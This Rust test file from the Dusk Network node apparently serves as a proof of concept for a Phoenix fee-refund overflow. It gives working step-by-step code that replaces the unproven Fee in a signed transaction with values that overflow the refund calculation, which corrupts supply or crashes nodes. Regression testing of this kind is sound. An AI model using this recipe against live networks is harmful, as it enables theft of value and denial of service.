// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.
//
// Copyright (c) DUSK NETWORK. All rights reserved.

//! PoC: Phoenix Fee Refund Overflow — Supply Corruption / Node DoS
//!
//! The Fee struct is excluded from the payload hash / ZK proof, so an
//! attacker can replace it with arbitrary values. When `gas_price` is set
//! large enough that the refund `(gas_limit - gas_consumed) * gas_price`
//! overflows u64, one of two things happens depending on build configuration:
//!
//! 1. **With `overflow-checks = true` for all deps**: the WASM contract traps
//!    inside `Fee::gen_remainder_note()`, and the host code in
//!    `vm/src/execute.rs` calls `.expect("Refunding must succeed")`, which
//!    panics — **crashing the node** (remote DoS).
//!
//! 2. **With wrapping arithmetic** (current build — `overflow-checks` only
//!    applies to the `transfer-contract` package, not its dependency
//!    `dusk-core` where `gen_remainder_note` lives): the multiplication wraps
//!    around silently, producing an incorrect refund note value. This corrupts
//!    the supply — the sender receives a refund note with a wrapped value that
//!    bears no relation to the actual gas spent.
//!
//! In either case, the root cause is the same: the Fee is not
//! covered by the ZK proof, allowing arbitrary post-proof manipulation.
//!
//! ## Overflow chain
//!
//! ```text
//! Fee { gas_limit: 10^19, gas_price: 2 }
//!   -> gen_remainder_note(gas_consumed ≈ 10^6)
//!     -> (10^19 - 10^6) * 2 ≈ 2×10^19 > u64::MAX (1.84×10^19)
//!       -> wrapping: value ≈ 1.55×10^18 (corrupted)
//!       -> OR with overflow-checks: WASM trap -> .expect() -> NODE CRASH
//! ```

use dusk_core::transfer::Transaction;
use dusk_core::transfer::phoenix::{
    Fee, Payload, Transaction as PhoenixTransaction, TxSkeleton,
};
use dusk_rusk_test::common::state::ExecuteResult;
use dusk_rusk_test::{Result, RuskVmConfig, TestContext};
use rand::SeedableRng;
use rand::rngs::StdRng;
use tracing::info;

use crate::common::logger;
use crate::common::state::generator_procedure;

const BLOCK_GAS_LIMIT: u64 = 100_000_000_000;

/// Verifies that a Phoenix transaction with an overflow-inducing Fee is
/// rejected and the refund does NOT corrupt the supply.
///
/// - FAILS while the vulnerability is active: the malicious tx executes and the
///   sender's balance changes due to the corrupted refund note (wrapping
///   overflow produces an incorrect value).
/// - PASSES once the fix is applied: the malicious tx is rejected during
///   preverify or execution, and no corruption occurs.
///
/// Note: If `overflow-checks = true` were applied to all dependencies
/// (including `dusk-core`), this would instead crash the node via a WASM
/// trap in `gen_remainder_note()` followed by `.expect("Refunding must
/// succeed")` in `vm/src/execute.rs`.
#[tokio::test(flavor = "multi_thread")]
pub async fn fee_refund_overflow_poc() -> Result<()> {
    logger();

    let state_toml = include_str!("../config/transfer.toml");
    let vm_config = RuskVmConfig::new().with_block_gas_limit(BLOCK_GAS_LIMIT);
    let tc = TestContext::instantiate(state_toml, vm_config).await?;

    let wallet = tc.wallet();
    let rusk = tc.rusk();
    let mut rng = StdRng::seed_from_u64(0xbeef);

    // Record the sender's initial balance
    let initial_balance =
        wallet.get_balance(0).expect("Failed to get balance").value;
    info!("=== Phoenix Fee Refund Overflow PoC ===");
    info!("Initial balance: {} LUX", initial_balance);

    let receiver_pk = wallet
        .phoenix_public_key(0)
        .expect("Failed to get public key");

    // Step 1: Create a legitimate transaction with normal gas parameters
    let honest_gas_limit: u64 = 100_000_000;
    let honest_gas_price: u64 = 1;

    let tx = wallet
        .phoenix_transfer(
            &mut rng,
            0,
            &receiver_pk,
            0, // transfer_value
            honest_gas_limit,
            honest_gas_price,
        )
        .expect("Failed to create transaction");

    info!(
        "Honest tx: gas_limit={}, gas_price={}, max_fee={}",
        honest_gas_limit,
        honest_gas_price,
        honest_gas_limit * honest_gas_price
    );

    // Step 2: Extract the inner PhoenixTransaction
    let phoenix_tx = match &tx {
        Transaction::Phoenix(ptx) => ptx,
        _ => panic!("Expected a Phoenix transaction"),
    };

    // Step 3: Reconstruct with overflow-inducing Fee
    //
    // gas_limit = 10^19 (≈ 0.54 × u64::MAX), gas_price = 2
    // After execution, gas_consumed ≈ a few million, so:
    //   remainder = (10^19 - gas_consumed) × 2 ≈ 2×10^19 > u64::MAX
    //
    // With wrapping arithmetic:
    //   2×10^19 - 2^64 ≈ 1.55×10^18 (corrupted refund value)
    let overflow_gas_limit: u64 = 10_000_000_000_000_000_000; // 10^19
    let overflow_gas_price: u64 = 2;

    let original_fee = phoenix_tx.fee();
    let overflow_fee = Fee {
        gas_limit: overflow_gas_limit,
        gas_price: overflow_gas_price,
        stealth_address: original_fee.stealth_address,
        sender: original_fee.sender,
    };

    let tx_skeleton = TxSkeleton {
        root: *phoenix_tx.root(),
        nullifiers: phoenix_tx.nullifiers().to_vec(),
        outputs: phoenix_tx.outputs().clone(),
        max_fee: phoenix_tx.max_fee(),
        deposit: phoenix_tx.deposit(),
    };

    let payload = Payload {
        chain_id: phoenix_tx.chain_id(),
        tx_skeleton,
        fee: overflow_fee,
        data: None,
    };

    let malicious_phoenix_tx = PhoenixTransaction::from_payload_and_proof(
        payload,
        phoenix_tx.proof().to_vec(),
    );
    let malicious_tx: Transaction = malicious_phoenix_tx.into();

    info!(
        "Malicious tx: gas_limit={}, gas_price={} \
         (refund product overflows u64, wraps to corrupted value)",
        overflow_gas_limit, overflow_gas_price
    );

    // Step 4: Execute through the full pipeline (including preverify)
    //
    // While vulnerable, this succeeds and the refund produces a note with
    // a corrupted (wrapped) value. After the fix, the tx should be rejected.
    generator_procedure(
        rusk,
        &[malicious_tx],
        2, // block_height
        BLOCK_GAS_LIMIT,
        vec![],
        Some(ExecuteResult {
            executed: 0,
            discarded: 1,
        }),
    )?;

    // Step 5: Check the sender's balance after the attack
    let final_balance =
        wallet.get_balance(0).expect("Failed to get balance").value;

    info!("Final balance: {} LUX", final_balance);
    info!(
        "Balance change: {} LUX",
        final_balance as i128 - initial_balance as i128
    );

    // Step 6: Assert NO supply corruption occurred.
    //
    // While the vulnerability is active, the overflow-inducing fee causes
    // gen_remainder_note() to compute:
    //   (10^19 - gas_spent) * 2 ≈ 2×10^19 > u64::MAX
    //
    // With wrapping arithmetic (current build), this wraps to ~1.55×10^18,
    // producing a refund note with a corrupted value. The sender's balance
    // changes in an unpredictable way — either inflating or deflating
    // depending on the exact wrapped value vs honest refund.
    //
    // With overflow-checks enabled for all deps, this would instead crash
    // the node (WASM trap → .expect() panic in execute.rs).
    //
    // Either way: once fixed, the tx is rejected and no balance change
    // occurs, so this assertion PASSES.
    assert!(
        final_balance <= initial_balance,
        "SUPPLY CORRUPTION: balance went from {} to {} LUX — \
         the overflow-inducing Fee replacement produced a corrupted \
         refund note (wrapping arithmetic). The malicious transaction \
         should have been rejected.",
        initial_balance,
        final_balance,
    );

    Ok(())
}
